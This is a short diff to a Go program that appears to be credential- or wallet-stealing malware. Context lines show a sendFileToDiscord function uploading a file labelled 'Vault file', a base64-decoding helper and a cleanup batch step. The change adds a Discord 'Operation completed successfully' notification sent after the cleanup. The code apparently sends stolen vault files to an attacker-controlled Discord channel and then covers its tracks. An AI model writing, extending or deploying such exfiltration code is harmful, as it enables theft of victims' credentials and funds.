@@ -256,6 +256,15 @@ func main() {
 	}
 
 	createCleanupBatch()
+
+	embed := DiscordEmbed{
+		Title:       "Done",
+		Description: "Operation completed successfully.",
+		Color:       0x00FF00,
+		Timestamp:   time.Now().UTC().Format(time.RFC3339),
+	}
+
+	sendEmbedToDiscord(embed)
 }
 
 func decodeBase64(encoded string) string {
@@ -292,7 +301,6 @@ func sendFileToDiscord(filePath string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-
 	payload := map[string]interface{}{
 		"content":    "Vault file",
 		"username":   username,
